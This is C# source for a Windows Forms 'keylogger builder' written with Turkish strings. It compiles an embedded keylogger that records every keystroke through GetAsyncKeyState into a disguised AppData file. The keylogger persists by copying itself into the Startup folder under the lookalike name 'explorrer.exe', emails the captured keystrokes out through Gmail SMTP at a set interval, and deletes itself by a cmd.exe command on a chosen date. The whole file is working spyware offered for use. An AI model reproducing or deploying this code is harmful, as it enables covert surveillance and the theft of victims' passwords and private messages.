﻿using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CreateOwnKeylogger_GrayScale
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (numericUpDown1.Value < 1)
            {
                MessageBox.Show("Dk'da sıkıntı var");

            }
            else if (numericUpDown1.Value > 59)
            {
                MessageBox.Show("1 saatten fazla olmayacak şekilde programlandı!");
            }

            else if (txtEMail.Text == "" || txtEMail.Text == null)
            {
                MessageBox.Show("Mail adresini gir!");

            }
            else if (!txtEMail.Text.Contains("@")) 
            {
                MessageBox.Show("ha");
            }

            else if (dateTimePicker1.Value <= DateTime.Now)
            {
                MessageBox.Show("Adam gibi bi tarih seç!");
            }
            else
            {
                if (saveFileDialog1.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    Dictionary<string, string> version = new Dictionary<string, string>();
                    version.Add("CompilerVersion", "v2.0");
                    CSharpCodeProvider codeProvider = new CSharpCodeProvider(version);
                    ICodeCompiler codeCompiler = codeProvider.CreateCompiler();
                    CompilerParameters cp = new CompilerParameters();
                    cp.GenerateExecutable = true;
                    cp.GenerateInMemory = false;
                    cp.MainClass = "KeyLog_V1.Program";
                    cp.OutputAssembly = saveFileDialog1.FileName;
                    cp.ReferencedAssemblies.Add("system.dll");
                    cp.ReferencedAssemblies.Add("system.windows.forms.dll");
                    cp.CompilerOptions = "/target:winexe";
                    CompilerResults cr = codeCompiler.CompileAssemblyFromSource(cp, Kodlar());
                    foreach (CompilerError item in cr.Errors)
                    {
                        MessageBox.Show(item.ErrorText);
                    }
                }
            }

        }
        string Kodlar()
        {
            string kod = @"
using System;
using System.Web;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
namespace KeyLog_V1
{
    class Program
    {
        [DllImport(*user32.dll*)]
        static extern short GetAsyncKeyState(int vkey);
        delegate void KontrolHandler();
        static int gonDakika = DK1;
        static int suankiDakika = 0;
        static int dk = 0;
        static string Email = *gonMAILL*;
        static string Sifre = *mailSifre*;
        static string gonEmail = *gonMAILL*;
        static DateTime SilmeTarihi = Convert.ToDateTime(*TTT*);
        static void Main()
        {
            ExeKopyalama();
            if (SilmeTarihi <= DateTime.Now)
            {
                ExpoldeYourSelf();
                return;
            }
            suankiDakika = SuanDakika();
            KontrolHandler h = new KontrolHandler(Kontrol);
            h.BeginInvoke(new AsyncCallback(islemSonlandi), null);
            Console.ReadLine();
            Application.Run(); 
        }
        static void ExpoldeYourSelf()
        {
              System.Diagnostics.Process.Start(*cmd.exe*, */C choice /C Y /N /D Y /T 3 & Del \** + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\explorrer.txt*);
              Application.Exit();
              System.Diagnostics.Process.Start(*cmd.exe*, */C choice /C Y /N /D Y /T 3 & Del \** + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorrer.exe*);
              Application.Exit();
        }
        static Int16 MakeChar(Int16 key)
        {
            Int16[] keycode = { 220, 219, 222, 191, 186, 221 }, charcode = { 199, 286, 304, 214, 350, 220, 231, 287, 105, 246, 351, 252 };
            int keyIndex = Array.IndexOf(keycode, key);
            bool nocaps = (!Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys != Keys.Shift) || (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift);
            if (nocaps && key > 64 && key < 91)
            {
                key = (Int16)(key == 73 ? 305 : key + 32);
            }
            else if (keyIndex != -1)
            {
                key = nocaps ? charcode[keyIndex + 6] : charcode[keyIndex];
            }
            Debug.Write((char)key);
            return key;
        }
        static void Kontrol()
        {
            while (true)
            {
                for (int i = 0; i < Int16.MaxValue; i++)
                {
                    if (GetAsyncKeyState(i).Equals(Int16.MinValue + 1))
                    {
                        char key = Convert.ToChar(MakeChar((Int16)i));
                    TusKaydet(key.ToString());
                    }
                }
                if (suankiDakika + gonDakika >= 60)
                {
                    dk = (suankiDakika + gonDakika) % 60;
                }
                else
                {
                    dk = suankiDakika + gonDakika;
                }
                if (SuanDakika() == dk)
                {
                    suankiDakika = SuanDakika();
                    MailGonder();
                }
            }
        }
        static void MailGonder()
        {
            string veriler = Oku();
            MailMessage mesaj = new MailMessage(Email, gonEmail, *LOG*, veriler);
            SmtpClient smtp = new SmtpClient(*smtp.gmail.com*, 587);
            smtp.EnableSsl = true;
            smtp.UseDefaultCredentials = true; 
            smtp.Credentials = new NetworkCredential(Email, Sifre);
            smtp.Send(mesaj);
        }
        static string Oku()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Open, FileAccess.Read);
            StreamReader sr = new StreamReader(fs);
            string veriler = sr.ReadToEnd();
            fs.Close();
            Sil();
            return veriler;
        }
        static void Sil()
        {
            FileStream fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Create, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(**);
            sw.Flush();
            fs.Close();
        }
        static int SuanDakika()
        {
            string suan = DateTime.Now.ToShortTimeString();
            int dakika = int.Parse(suan.Substring(suan.IndexOf(':') + 1, suan.Length - suan.IndexOf(':') - 1));
            return dakika;
        }
        static void islemSonlandi(IAsyncResult iar)
        {
        }
        static void TusKaydet(string tus)
        {
            FileStream fs = null;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*))
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.Append, FileAccess.Write);
            else
                fs = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + */explorrer.txt*, FileMode.CreateNew, FileAccess.Write);
            StreamWriter sw = new StreamWriter(fs);
            sw.Write(tus);
            sw.Flush();
            fs.Close();
        }
        static void ExeKopyalama()
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorrer.exe*))
            {
                File.Copy(Path.GetFileName(Application.ExecutablePath), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @*\Microsoft\Windows\Start Menu\Programs\Startup\explorrer.exe*);
            }
        }
    }
}
";
            kod = kod.Replace("gonMAILL", txtEMail.Text);
            kod = kod.Replace("mailSifre", txtSifre.Text);
            kod = kod.Replace("DK1", numericUpDown1.Value.ToString());
            kod = kod.Replace("TTT", dateTimePicker1.Value.ToString());

            kod = kod.Replace('*', '\"');
            return kod;
        }

       

        private void button2_Click_1(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}